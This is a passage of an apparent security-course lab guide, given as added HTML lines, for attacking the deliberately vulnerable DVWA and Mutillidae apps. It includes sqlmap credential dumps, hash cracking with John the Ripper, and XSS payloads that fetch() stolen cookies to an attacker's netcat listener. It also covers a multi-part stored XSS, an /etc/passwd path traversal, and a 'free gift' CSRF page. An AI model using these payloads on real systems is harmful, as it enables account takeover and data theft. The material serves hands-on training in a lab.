+<span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"security=low; PHPSESSID=&lt;PASTE-YOUR-PHPSESSID-HERE&gt;"</span> <span class="token parameter variable">--dbs</span>
+</code></pre><p>🔹 <strong>Explanation:</strong></p>
+<ul>
+<li><code>--cookie="security=low; PHPSESSID=&lt;SESSION-ID&gt;"</code> → Ensures authentication works.</li>
+<li><code>--dbs</code> → Fetches available databases on the server.</li>
+</ul>
+<p>📌 <strong>Expected Outcome:</strong></p>
+<ul>
+<li>SQLMap <strong>detects SQL Injection</strong> and lists available databases.</li>
+</ul>
+<hr>
+<h4 id="-troubleshooting-if-youre-redirected-to-the-login-page"><strong>🔹 Troubleshooting (If You’re Redirected to the Login Page)</strong> </h4>
+<p>🔹 If SQLMap <strong>still asks about a login page</strong>, follow these additional steps:</p>
+<h5 id="-option-1-recheck-phpsessid"><strong>✅ Option 1: Recheck PHPSESSID</strong> </h5>
+<p>1️⃣ <strong>Clear cookies</strong> and log in again to get a fresh session.<br>
+2️⃣ <strong>Repeat Step 1</strong> to get the latest <code>PHPSESSID</code>.</p>
+<h5 id="-option-2-capture-full-cookie-string-if-needed"><strong>✅ Option 2: Capture Full Cookie String (If Needed)</strong> </h5>
+<p>1️⃣ In <strong>Developer Tools</strong> → <strong>Network</strong> tab, reload the page.<br>
+2️⃣ Click on <strong>any request</strong> to <code>dvwa</code> and go to <strong>Headers</strong>.<br>
+3️⃣ Copy the full <code>Cookie:</code> string and use it in SQLMap:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://&lt;M2-IP&gt;/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="token punctuation">\</span>
+<span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"security=low; PHPSESSID=&lt;SESSION-ID&gt;; other_cookie=value"</span> <span class="token parameter variable">--dbs</span>
+</code></pre><h5 id="-option-3-ignore-redirects"><strong>✅ Option 3: Ignore Redirects</strong> </h5>
+<p>If SQLMap <strong>still hits the login page</strong>, try:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://&lt;M2-IP&gt;/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="token punctuation">\</span>
+<span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"security=low; PHPSESSID=&lt;SESSION-ID&gt;"</span> <span class="token parameter variable">--dbs</span> --ignore-redirects
+</code></pre><hr>
+<h4 id="-step-3-extract-user-credentials"><strong>🔹 Step 3: Extract User Credentials</strong> </h4>
+<p>📌 <strong>Now, let's retrieve user credentials.</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://&lt;M2-IP&gt;/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"security=low; PHPSESSID=&lt;SESSION-ID&gt;"</span> <span class="token parameter variable">-D</span> dvwa <span class="token parameter variable">--tables</span>
+</code></pre><p>🔹 <strong>Explanation of the command:</strong></p>
+<ul>
+<li><code>-D dvwa</code> → Targets the <code>dvwa</code> database.</li>
+<li><code>--tables</code> → Lists <strong>all tables</strong> in the database.</li>
+</ul>
+<p>📌 <strong>Expected Outcome:</strong></p>
+<ul>
+<li>SQLmap displays all <strong>tables</strong> in the <code>dvwa</code> database.</li>
+<li>Look for a table like <code>users</code> or <code>accounts</code>.</li>
+</ul>
+<hr>
+<h4 id="-step-4-dump-the-users-table"><strong>🔹 Step 4: Dump the Users Table</strong> </h4>
+<p>📌 <strong>Run the following command to extract usernames and passwords:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>sqlmap <span class="token parameter variable">-u</span> <span class="token string">"http://&lt;M2-IP&gt;/dvwa/vulnerabilities/sqli/?id=1&amp;Submit=Submit"</span> <span class="token parameter variable">--cookie</span><span class="token operator">=</span><span class="token string">"security=low; PHPSESSID=&lt;SESSION-ID&gt;"</span> <span class="token parameter variable">-D</span> dvwa <span class="token parameter variable">-T</span> <span class="token function">users</span> <span class="token parameter variable">--dump</span>
+</code></pre><p>🔹 <strong>Explanation of the command:</strong></p>
+<ul>
+<li><code>-T users</code> → Targets the <strong>users</strong> table.</li>
+<li><code>--dump</code> → Dumps all data from the table.</li>
+</ul>
+<p>📌 <strong>Expected Outcome:</strong></p>
+<ul>
+<li>SQLmap extracts <strong>all user credentials</strong> (usernames and password hashes).</li>
+<li>Fetched data is logged to a <code>csv</code> file; (look for the file location in the output)</li>
+</ul>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token punctuation">..</span>.
+<span class="token punctuation">[</span><span class="token number">18</span>:18:26<span class="token punctuation">]</span> <span class="token punctuation">[</span>INFO<span class="token punctuation">]</span> fetched data logged to text files under <span class="token string">'/home/kali/.local/share/sqlmap/output/192.168.10.4'</span>
+</code></pre><hr>
+<h4 id="-step-5-crack-the-password-hashes"><strong>🛠 Step 5: Crack the Password Hashes</strong> </h4>
+<h5 id="-1️⃣-extract-the-password-hashes"><strong>📌 1️⃣ Extract the Password Hashes</strong> </h5>
+<p>🔹 The <strong>password hashes are in the 4th column</strong> of your SQLMap dump:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">cut</span> -d<span class="token string">','</span> <span class="token parameter variable">-f4</span> users.csv <span class="token operator">|</span> <span class="token function">sed</span> <span class="token string">'s/ .*//'</span> <span class="token operator">&gt;</span> hashes.txt
+</code></pre><p>Example extracted hashes:</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>5f4dcc3b5aa765d61d8327deb882cf99
+e99a18c428cb38d5f260853678922e03
+8d3533d75ae2c3966d7e0d4fcc69216b
+0d107d09f5bbe40cade3de5c71e9e9b7
+5f4dcc3b5aa765d61d8327deb882cf99
+</code></pre><p>🔹 <strong>Alternatively, manually extract hash values from <code>users.csv</code>, create a new file (<code>hashes.txt</code>) and save the extracted hashes:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">nano</span> hashes.txt
+</code></pre><p>📌 <strong>Paste the extracted hashes into <code>hashes.txt</code> (one per line) and save the file.</strong></p>
+<hr>
+<h5 id="-2️⃣-identify-the-hash-type"><strong>📌 2️⃣ Identify the Hash Type</strong> </h5>
+<p>Before cracking, determine the hash type using <code>hashid</code> or <code>hash-identifier</code>:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>hashid hashes.txt
+</code></pre><p>or</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>hash-identifier hashes.txt
+</code></pre><p>📌 <strong>Most DVWA passwords use MD5 (e.g., <code>5f4dcc3b5aa765d61d8327deb882cf99</code>).</strong></p>
+<hr>
+<h5 id="-3️⃣-crack-passwords-using-john-the-ripper"><strong>📌 3️⃣ Crack Passwords Using John the Ripper</strong> </h5>
+<p>Once confirmed as <strong>MD5 hashes</strong>, crack them using <strong>John the Ripper</strong>.</p>
+<p>✅ <strong>If <code>rockyou.txt</code> does not exist (only <code>rockyou.txt.gz</code> exists), unzip it first:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">ls</span> <span class="token parameter variable">-l</span> /usr/share/wordlists/rockyou.txt*
+<span class="token function">sudo</span> <span class="token function">gzip</span> <span class="token parameter variable">-dk</span> /usr/share/wordlists/rockyou.txt.gz
+</code></pre><p>✅ <strong>Then run John using RockYou:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code>john <span class="token parameter variable">--format</span><span class="token operator">=</span>raw-md5 <span class="token parameter variable">--wordlist</span><span class="token operator">=</span>/usr/share/wordlists/rockyou.txt hashes.txt
+</code></pre><p>🔹 <strong>Explanation:</strong></p>
+<ul>
+<li><code>--format=raw-md5</code> → Specifies MD5 hashes.</li>
+<li><code>--wordlist=/usr/share/wordlists/rockyou.txt</code> → Uses the RockYou dictionary.</li>
+<li><code>hashes.txt</code> → File containing extracted hashes.</li>
+</ul>
+<p><strong>📌 Expected Outcome</strong></p>
+<ul>
+<li>John the Ripper <strong>recovers plaintext passwords</strong>.</li>
+</ul>
+<hr>
+<h4 id="-deliverables-for-task-2-1">📌 Deliverables for Task 2: </h4>
+<p>✅ Screenshot: Captured PHPSESSID from browser Developer Tools.<br>
+✅ Screenshot: SQLmap output showing detected databases.<br>
+✅ Screenshot: SQLmap output listing tables in the dvwa database.<br>
+✅ Screenshot: SQLmap output showing dumped user credentials.<br>
+✅ Answers the following questions:</p>
+<ul>
+<li><strong>Q10.</strong> What databases exist on the server?</li>
+<li><strong>Q11.</strong> How can an attacker use <strong>dumped credentials</strong> to escalate an attack?</li>
+</ul>
+<div style="text-align: center; margin: 15px 1;">
+    <hr style="border: 5px; height: 20px; width: 100%;">
+</div>
+<h2 id="part-3-cross-site-scripting-xss-30-pts"><strong>Part 3: Cross-Site Scripting (XSS) (30 pts)</strong> </h2>
+<h2 id="-objective-1"><strong>📌 Objective:</strong> </h2>
+<p>✔️ Understand <strong>how Cross-Site Scripting (XSS) attacks work</strong>.<br>
+✔️ Perform <strong>Reflected XSS and Stored XSS attacks</strong>.<br>
+✔️ Steal <strong>session cookies</strong> and hijack user accounts.<br>
+✔️ Learn <strong>how to detect and prevent XSS attacks</strong>.</p>
+<hr>
+<h3 id="-task-1-exploit-reflected-xss-10-pts"><strong>🔹 Task 1: Exploit Reflected XSS (10 pts)</strong> </h3>
+<p>📌 <strong>Reflected XSS happens when malicious input is immediately included in the response and executed in the victim’s browser.</strong></p>
+<h4 id="-step-1-open-the-reflected-xss-page"><strong>🔹 Step 1: Open the Reflected XSS Page</strong> </h4>
+<p>1️⃣ In <strong>DVWA</strong>, navigate to:</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>XSS (Reflected)
+</code></pre><p>2️⃣ Enter a <strong>test value</strong> in the input box and submit.</p>
+<hr>
+<h4 id="-step-2-inject-a-simple-xss-payload"><strong>🔹 Step 2: Inject a Simple XSS Payload</strong> </h4>
+<p>📌 <strong>Enter the following JavaScript code into the input field:</strong></p>
+<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'XSS Exploited!'</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre><p>3️⃣ Click <strong>Submit</strong>.<br>
+4️⃣ Observe whether the alert executes.</p>
+<hr>
+<h4 id="step-3-modify-the-attack-to-steal-cookies-to-netcat"><strong>Step 3: Modify the Attack to Steal Cookies to Netcat</strong> </h4>
+<p>Instead of an alert, modify the script to send <strong>session cookies</strong> to your attacker's <strong>Netcat listener</strong> on port <strong>80</strong>:<br>
+On your <strong>Kali Linux</strong>, start a Netcat listener to capture the incoming cookies:</p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">80</span>
+</code></pre><p>When a user triggers the XSS payload, their <strong>session cookie</strong> will be displayed in your Netcat terminal.</p>
+<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">'http://&lt;Kali-IP&gt;/?cookie='</span> <span class="token operator">+</span> <span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token property-access">cookie</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre><p>📌 Replace <code>&lt;Kali-IP&gt;</code> with your <strong>Kali Linux IP address</strong>.<br>
+To send the stolen cookies to your attacker's <strong>Netcat (NC) listener</strong> on port <strong>80</strong>, modify the payload as follows:</p>
+<ul>
+<li><strong>Netcat (NC) is listening on port 80</strong>, so we send the cookies as a <strong>GET request</strong> to that port.</li>
+<li><strong>fetch() is used</strong> instead of <code>document.location</code>, as Netcat doesn't serve a webpage.</li>
+<li>The cookie will be captured in <strong>Netcat</strong> when a user visits the malicious link.</li>
+</ul>
+<hr>
+<h4 id="-deliverables-for-task-1-2">📌 Deliverables for Task 1: </h4>
+<p>✅ Screenshot: Reflected XSS attack triggering an alert popup.<br>
+✅ Screenshot: Captured stolen cookie sent to attacker's machine.</p>
+<hr>
+<h3 id="-task-2-exploit-stored-xss-10-pts"><strong>🔹 Task 2: Exploit Stored XSS (10 pts)</strong> </h3>
+<p>📌 <strong>Stored XSS is more severe than reflected XSS because the malicious script is saved on the server and executed for every visitor.</strong></p>
+<h4 id="-basic-stored-xss-10-pts"><strong>🔹 Basic Stored XSS (10 pts)</strong> </h4>
+<p>1️⃣ In <strong>DVWA</strong>, navigate to:</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>XSS (Stored)
+</code></pre><p>2️⃣ Find the <strong>comment form</strong> where users can leave messages.<br>
+3️⃣ Enter the following payload in the <strong>message box</strong>:</p>
+<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token property-access">cookie</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre><p>4️⃣ Click <strong>Sign Guestbook</strong> and refresh the page.<br>
+5️⃣ The <strong>alert should pop up again</strong>, proving the script is stored.</p>
+<h5 id="-why-is-this-dangerous"><strong>📝 Why Is This Dangerous?</strong> </h5>
+<ul>
+<li>Every time a user visits the page, the <strong>malicious script runs automatically</strong>.</li>
+<li>Attackers can store <strong>persistent scripts</strong> that affect <strong>all visitors</strong> to the page.</li>
+</ul>
+<hr>
+<h4 id="-deliverables-for-task-2-2">📌 Deliverables for Task 2: </h4>
+<p>✅ Screenshot: Stored XSS attack triggering an alert when reloading the page.<br>
+✅ Screenshot: Browser console showing the stored malicious script in the page source.</p>
+<hr>
+<h3 id="-task-3-advanced-stored-xss-multi-step-cookie-theft-10-pts"><strong>🔹 Task 3: Advanced Stored XSS: Multi-Step Cookie Theft (10 pts)</strong> </h3>
+<p>📌 <strong>If there is a character limit, we can split the payload across multiple stored messages.</strong></p>
+<hr>
+<h4 id="-step-1-inject-the-first-message"><strong>🔹 Step 1: Inject the First Message</strong> </h4>
+<p>Stores the attacker's <strong>Kali IP</strong> in a variable:</p>
+<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword keyword-var">var</span> a<span class="token operator">=</span><span class="token string">'192.168.10.x'</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre><ul>
+<li>This <strong>saves the attacker's IP</strong> for later use.</li>
+<li>The variable remains accessible when the page reloads.</li>
+</ul>
+<hr>
+<h4 id="-step-2-inject-the-second-message"><strong>🔹 Step 2: Inject the Second Message</strong> </h4>
+<p>Builds the base URL for the cookie theft request:</p>
+<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token keyword keyword-var">var</span> b<span class="token operator">=</span><span class="token string">'//'</span><span class="token operator">+</span>a<span class="token operator">+</span><span class="token string">'/c?'</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre><ul>
+<li>This <strong>concatenates the attacker's IP</strong> into a valid URL format.</li>
+<li><strong>Stored in the page</strong> and available for later execution.</li>
+</ul>
+<hr>
+<h4 id="-step-3-inject-the-final-execution-message"><strong>🔹 Step 3: Inject the Final Execution Message</strong> </h4>
+<p>Steals the cookies:</p>
+<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span>b<span class="token operator">+</span><span class="token dom variable">document</span><span class="token punctuation">.</span><span class="token property-access">cookie</span><span class="token punctuation">)</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
+</code></pre><ul>
+<li>This <strong>retrieves the session cookie</strong> and <strong>sends it to the attacker</strong>.</li>
+<li>Since <strong><code>b</code> was stored earlier</strong>, this works even with character limitations.</li>
+</ul>
+<hr>
+<h4 id="-step-4-set-up-an-attacker-listener-on-kali"><strong>🔹 Step 4: Set Up an Attacker Listener on Kali</strong> </h4>
+<p>📌 <strong>On Kali Linux, open a terminal and run:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">sudo</span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">80</span>
+</code></pre><p>📌 This starts <strong>Netcat</strong>, which listens for incoming connections on <strong>port 80</strong> to capture stolen cookies.</p>
+<hr>
+<h4 id="-step-5-verify-the-attack"><strong>🔹 Step 5: Verify the Attack</strong> </h4>
+<p>1️⃣ <strong>In Incognito Mode</strong>, log in to Mutillidae with the <strong>admin/password</strong> account.<br>
+2️⃣ Open <strong>Developer Tools (<code>F12</code>) → Storage → Cookies</strong>.<br>
+3️⃣ Locate the <strong>PHPSESSID</strong> cookie and note its value.<br>
+4️⃣ Visit the <strong>Stored XSS page</strong> where the attack payload was injected.<br>
+5️⃣ <strong>Check your Kali terminal (<code>nc</code> logs)</strong>:</p>
+<ul>
+<li>Confirm that you <strong>received the victim’s session ID</strong>.</li>
+<li>The <strong>PHPSESSID captured by <code>nc</code> should match</strong> the one in Developer Tools.</li>
+</ul>
+<p>✅ <strong>If successful, this proves the XSS attack can steal session cookies and compromise accounts!</strong> 🚀</p>
+<hr>
+<h3 id="-deliverables-for-task-3-1">📌 Deliverables for Task 3: </h3>
+<p>✅ Screenshot: Multi-step XSS attack triggering across different stored messages.<br>
+✅ Screenshot: Captured stolen cookies appearing in the Netcat (nc) listener.<br>
+✅ Screenshot: Browser console showing the execution of stored XSS payloads.</p>
+<hr>
+<h4 id="-educational-notes-best-practices-to-prevent-xss"><strong>✅ Educational Notes: Best Practices to Prevent XSS</strong> </h4>
+<p>1️⃣ <strong>Input Validation</strong></p>
+<ul>
+<li><strong>Sanitize all user inputs</strong> to remove malicious code.</li>
+<li>Use <strong>allowlists</strong> to restrict accepted characters.</li>
+</ul>
+<p>2️⃣ <strong>Output Encoding</strong></p>
+<ul>
+<li>Convert special characters to <strong>safe HTML entities</strong>:<pre data-role="codeBlock" data-info="" class="language-text"><code>&lt; → &amp;lt;
+&gt; → &amp;gt;
+" → &amp;quot;
+' → &amp;#x27;
+</code></pre></li>
+<li>Use <strong>HTML escaping functions</strong>:
+<ul>
+<li><strong>PHP</strong>: <code>htmlspecialchars($input, ENT_QUOTES, 'UTF-8')</code></li>
+<li><strong>Python (Django)</strong>: <code>escape(input)</code></li>
+</ul>
+</li>
+</ul>
+<p>3️⃣ <strong>Content Security Policy (CSP)</strong></p>
+<ul>
+<li>Prevents <strong>inline scripts</strong> from executing.</li>
+<li>Example CSP header:<pre data-role="codeBlock" data-info="http" class="language-http http"><code><span class="token header"><span class="token header-name keyword">Content-Security-Policy</span><span class="token punctuation">:</span> <span class="token header-value csp languages-csp"><span class="token directive property">default-src</span> <span class="token keyword safe keyword-'self'">'self'</span><span class="token punctuation">;</span> <span class="token directive property">script-src</span> <span class="token keyword safe keyword-'self'">'self'</span> <span class="token host url">https://trusted-cdn.com</span><span class="token punctuation">;</span></span></span>
+</code></pre></li>
+</ul>
+<p>4️⃣ <strong>Use HttpOnly Cookies</strong></p>
+<ul>
+<li>Prevents JavaScript from accessing session cookies:<pre data-role="codeBlock" data-info="http" class="language-http http"><code><span class="token header"><span class="token header-name keyword">Set-Cookie</span><span class="token punctuation">:</span> <span class="token header-value">sessionid=xyz123; HttpOnly; Secure</span></span>
+</code></pre></li>
+</ul>
+<div style="text-align: center; margin: 15px 1;">
+    <hr style="border: 5px; height: 20px; width: 100%;">
+</div>
+<h2 id="-part-4-directory-traversal-local-file-inclusion---lfi-15-pts"><strong>🔹 Part 4: Directory Traversal (Local File Inclusion - LFI) (15 pts)</strong> </h2>
+<h3 id="-objective-2"><strong>📌 Objective:</strong> </h3>
+<p>✔️ Understand <strong>how Directory Traversal (LFI) attacks work</strong>.<br>
+✔️ Use <strong>LFI to read system files and sensitive configurations</strong>.<br>
+✔️ Learn how <strong>attackers escalate LFI to Remote Code Execution (RCE)</strong>.<br>
+✔️ Identify <strong>real-world security risks</strong> and <strong>mitigation techniques</strong>.</p>
+<hr>
+<h3 id="-task-1-exploit-local-file-inclusion-lfi-15-pts"><strong>🔹 Task 1: Exploit Local File Inclusion (LFI) (15 pts)</strong> </h3>
+<p>📌 <strong>In this task, you will exploit an LFI vulnerability in DVWA to access system files.</strong></p>
+<h4 id="-step-1-open-the-file-inclusion-page"><strong>🔹 Step 1: Open the File Inclusion Page</strong> </h4>
+<p>📌 <strong>Access DVWA in your browser:</strong></p>
+<pre data-role="codeBlock" data-info="text" class="language-text text"><code>http://&lt;M2-IP&gt;/dvwa
+</code></pre><p>1️⃣ <strong>Login with default credentials:</strong></p>
+<ul>
+<li><strong>Username:</strong> <code>admin</code></li>
+<li><strong>Password:</strong> <code>password</code><br>
+2️⃣ Navigate to <strong>DVWA Security</strong> settings → Set Security Level to <strong>Low</strong>.<br>
+3️⃣ Go to <strong>DVWA File Inclusion (LFI) page.</strong></li>
+</ul>
+<hr>
+<h4 id="-step-2-read-system-files-using-path-traversal"><strong>🔹 Step 2: Read System Files Using Path Traversal</strong> </h4>
+<p>📌 <strong>Modify the URL parameter to include <code>/etc/passwd</code> (Linux password file):</strong></p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://&lt;M2-IP&gt;/dvwa/vulnerabilities/fi/?page=/../../../../etc/passwd
+</code></pre><p>📌 <strong>Note:</strong> The exact number of <code>../</code> sequences needed <strong>depends on the web server’s directory structure</strong>. If the file isn't found, <strong>increase or decrease the number of <code>../</code> levels</strong> until you successfully access <code>/etc/passwd</code>.</p>
+<hr>
+<h4 id="-deliverables-for-task-1-3">📌 Deliverables for Task 1: </h4>
+<p>✅ Screenshot: LFI attack successfully displaying /etc/passwd.<br>
+✅ Answer the following questions:</p>
+<ul>
+<li><strong>Q12.</strong> What did you find in <code>/etc/passwd</code>?</li>
+</ul>
+<div style="text-align: center; margin: 15px 1;">
+    <hr style="border: 5px; height: 20px; width: 100%;">
+</div>
+<h2 id="-part-5-cross-site-request-forgery-csrf-15-pts"><strong>🔹 Part 5: Cross-Site Request Forgery (CSRF) (15 pts)</strong> </h2>
+<h3 id="-objective-3"><strong>📌 Objective:</strong> </h3>
+<p>✔️ Understand <strong>how Cross-Site Request Forgery (CSRF) attacks work</strong>.<br>
+✔️ Exploit <strong>CSRF vulnerabilities that rely on GET requests</strong>.<br>
+✔️ Use <strong>HTML and JavaScript</strong> to craft <strong>stealthy CSRF attacks</strong>.<br>
+✔️ Learn <strong>how to detect and prevent CSRF attacks</strong>.</p>
+<hr>
+<h3 id="-task-1-perform-a-basic-csrf-attack-using-a-simple-link-15-pts"><strong>🔹 Task 1: Perform a Basic CSRF Attack Using a Simple Link (15 pts)</strong> </h3>
+<p>📌 <strong>CSRF occurs when an attacker tricks a logged-in user into unknowingly submitting a malicious request to a web application.</strong></p>
+<h4 id="-step-1-open-the-csrf-page"><strong>🔹 Step 1: Open the CSRF Page</strong> </h4>
+<p>1️⃣ In <strong>DVWA</strong>, navigate to:</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>CSRF
+</code></pre><p>2️⃣ You will see a form to <strong>change the user’s password</strong>.</p>
+<hr>
+<h4 id="-step-2-understand-the-password-change-request"><strong>🔹 Step 2: Understand the Password Change Request</strong> </h4>
+<p>📌 <strong>Use Developer Tools to analyze the structure of the GET request used for password changes.</strong></p>
+<p>1️⃣ Open <strong>Developer Tools (<code>F12</code>)</strong> in your browser.<br>
+2️⃣ Go to the <strong>Network</strong> tab and start monitoring requests.<br>
+3️⃣ Change the password to <code>password123</code> and click <strong>"Change"</strong>.<br>
+4️⃣ Look at the <strong>GET request</strong> sent to the server.</p>
+<p>📌 <strong>Expected request format:</strong></p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>GET /dvwa/vulnerabilities/csrf/?password_new=password123&amp;password_conf=password123&amp;Change=Change HTTP/1.1
+Host: &lt;M2-IP&gt;
+Cookie: PHPSESSID=&lt;session-id&gt;; security=low
+</code></pre><p>🔹 <strong>Because this request uses GET instead of POST, it is vulnerable to CSRF.</strong></p>
+<hr>
+<h4 id="-step-3-craft-a-csrf-exploit-using-a-simple-link"><strong>🔹 Step 3: Craft a CSRF Exploit Using a Simple Link</strong> </h4>
+<p>📌 <strong>An attacker can send the victim a link that looks harmless but changes their password.</strong></p>
+<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://&lt;M2-IP&gt;/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+Click Here for a Free Gift!
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
+</code></pre><p><strong>How It Works:</strong></p>
+<ul>
+<li>The victim <strong>thinks they are clicking a normal link</strong> but actually <strong>executes the CSRF attack</strong>.</li>
+<li>If they are <strong>already logged into DVWA</strong>, their password <strong>changes to <code>"hacked"</code></strong> without their knowledge.</li>
+</ul>
+<hr>
+<h4 id="-step-4-test-the-attack"><strong>🔹 Step 4: Test the Attack</strong> </h4>
+<p>1️⃣ <strong>Host the malicious link on Kali VM to simulate an attacker.</strong></p>
+<p>📌 <strong>Create a new HTML file (<code>csrf_attack.html</code>) on Kali:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">nano</span> csrf_attack.html
+</code></pre><p>📌 <strong>Paste the following code inside the file:</strong></p>
+<pre data-role="codeBlock" data-info="html" class="language-html html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Click Here for a Free Gift!<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>http://&lt;M2-IP&gt;/dvwa/vulnerabilities/csrf/?password_new=hacked&amp;password_conf=hacked&amp;Change=Change<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>
+      Click Here to Claim Your Prize!
+    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>
+  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">&gt;</span></span>
+<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">&gt;</span></span>
+</code></pre><p>📌 <strong>Save the file and exit (CTRL + X → Y → ENTER).</strong></p>
+<p>2️⃣ <strong>Host the page using Python’s built-in HTTP server:</strong></p>
+<pre data-role="codeBlock" data-info="bash" class="language-bash bash"><code><span class="token function">sudo</span> python3 <span class="token parameter variable">-m</span> http.server <span class="token number">8080</span>
+</code></pre><p>📌 Now, the exploit page is available at:</p>
+<pre data-role="codeBlock" data-info="" class="language-text"><code>http://&lt;Kali-IP&gt;:8080/csrf_attack.html
+</code></pre><p>3️⃣ <strong>On Attack Kali VM, open an incognito/private browser window (emulating a victim).</strong><br>
+4️⃣ <strong>Log into DVWA as <code>admin</code>.</strong><br>
+5️⃣ <strong>Visit <code>http://&lt;Kali-IP&gt;:8080/csrf_attack.html</code> and click the link.</strong><br>
+6️⃣ <strong>Verify that the password has changed by logging out and using <code>hacked</code> as the new password.</strong></p>
+<hr>
+<h4 id="-educational-note">📌 Educational Note </h4>
+<p>Incognito mode is being used to represent a <strong>separate victim browser session</strong> that is <strong>not sharing cookies, cache, or login state</strong> with your normal browser window. Concretely, it models:</p>
+<ul>
+<li><strong>A different user</strong> (or the same user in a fresh session) who is already logged in to DVWA.</li>
+<li><strong>An independent set of cookies</strong>, including a different <code>PHPSESSID</code>, so you can clearly show that the cookie you capture via XSS belongs to the “victim session,” not your attacker session.</li>
